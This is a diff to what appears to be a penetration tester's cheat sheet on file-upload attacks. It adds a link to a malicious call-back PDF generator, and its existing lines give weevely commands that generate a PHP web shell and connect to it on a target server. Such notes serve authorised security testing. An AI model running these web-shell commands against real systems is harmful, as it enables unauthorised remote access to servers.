@@ -1,5 +1,8 @@
 File Uploads
 
+malicious call-back PDF generator for use with Burp Collaborator
+	https://github.com/jonaslejon/malicious-pdf
+
 weevely
 	weevely generate password /root/shell.php
 	weevely http://target.com/folder/uploads/shell.php password
